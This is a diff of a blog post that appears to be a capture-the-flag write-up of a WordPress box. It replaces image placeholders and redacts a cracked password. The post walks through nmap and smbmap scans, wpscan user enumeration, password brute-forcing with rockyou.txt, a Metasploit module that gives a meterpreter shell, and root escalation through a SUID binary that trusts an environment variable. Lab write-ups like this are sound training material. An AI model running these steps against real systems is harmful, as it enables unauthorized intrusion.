@@ -13,13 +13,13 @@ comments: false
 <br>
 ## Starting with an Nmap scan, we see: 
 
-******1
+![img]({{ '/assets/images/blog/1-blog.png' | relative_url }}){: .center-image }
 <br>
 
 ## Let's do an SMB scan to check for any shares
 ## smbmap shows:
 
-******2
+![img]({{ '/assets/images/blog/2-blog.png' | relative_url }}){: .center-image }
 
 <br>
 {% highlight bash %}
@@ -44,28 +44,29 @@ wpscan --update                   - update
 wpscan --url <target_IP> -e vp,vt,u  -full scan 
 {% endhighlight bash %}
 
-******3
+![img]({{ '/assets/images/blog/3-blog.png' | relative_url }}){: .center-image }
 <br>
 
 ## Performing a full scan shows usernames: bjoel, kwheel
-******4
+![img]({{ '/assets/images/blog/4-blog.png' | relative_url }}){: .center-image }
 <br>
 
 ## We can brute force passwords for these usernames 
 wpscan --url http://<target_IP> --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
-******5
+![img]({{ '/assets/images/blog/5-blog.png' | relative_url }}){: .center-image }
 
 ## We get Karen Wheelers username and password
+{% highlight bash %}
 Username: kwheel
-Password: cutiepie1[redacted]
-******6
+Password: [redacted]
+{% endhighlight bash %}
+![img]({{ '/assets/images/blog/6-blog.png' | relative_url }}){: .center-image }
 <br>
 
 ## We now need to find the login page
 ## Looking at robots.txt: 
-Disallow: /wp-admin/
-Allow: /wp-admin/admin-ajax.php
-******7 NEED PIC 
+
+![img]({{ '/assets/images/blog/7-blog.png' | relative_url }}){: .center-image }
 
 
 ## We find the login page at: /wp-admin/
@@ -78,21 +79,22 @@ Allow: /wp-admin/admin-ajax.php
 <br>
 ## Searching WordPress 5.0 on Metasploit we can run the 1st option
 
-******8 
-
->enter: USERNAME PASSWORD RHOST AND LHOST AND LPORT
-
+![img]({{ '/assets/images/blog/8-blog.png' | relative_url }}){: .center-image }
+{% highlight bash %}
+enter: USERNAME PASSWORD RHOST AND LHOST AND LPORT
+{% endhighlight bash %}
 <br>
+
 ## We get a meterpreter shell as www-data
-******9
+![img]({{ '/assets/images/blog/9-blog.png' | relative_url }}){: .center-image }
 <br>
 
 ## Looking for the user flag, we see it's not where we think it is:
-******10
+![img]({{ '/assets/images/blog/10-blog.png' | relative_url }}){: .center-image }
 
 <br>
 ## Looking for clues we see a termination letter:
-******11 NEED PIC 
+![img]({{ '/assets/images/blog/11-blog.png' | relative_url }}){: .center-image } 
 
 <br>
 ## The company is "rubber ducky" and billy joel was let go for illegal use of removable media
@@ -101,30 +103,36 @@ Allow: /wp-admin/admin-ajax.php
 
 ## We will need to escalate our privileges
 Let try searching binaries with the SUID bit set: 
+{% highlight bash %}
 find / -type f -perm -04000 -ls 2>/dev/null 
-
+{% endhighlight bash %}
 <br>
+
 ## We see something interesting:
+{% highlight bash %}
 /usr/sbin/checker
+{% endhighlight bash %}
 
 ## This is a root owned binary, with the SUID flag set
-## It checks the "admin" environment variable and prints out "Not an Admin" if not correct
+## It checks the "admin" environment variable and prints out "Not an Admin" if not set
 <br>
 
 ## Let's see if we can set this environment variable:
+{% highlight bash %}
 $ export admin=1
 $ ltrace checker
+{% endhighlight bash %}
 <br>
 
-******12
+![img]({{ '/assets/images/blog/12-blog.png' | relative_url }}){: .center-image }
 ## Now it will run bash as root
 ## We get root and see the user flag where we tried to look before
 
-*******13
+![img]({{ '/assets/images/blog/13-blog.png' | relative_url }}){: .center-image }
 
-## We can now capture the root flag 
+## We can now capture the root flag !
 
-******14
+![img]({{ '/assets/images/blog/14-blog.png' | relative_url }}){: .center-image }
 
 
 
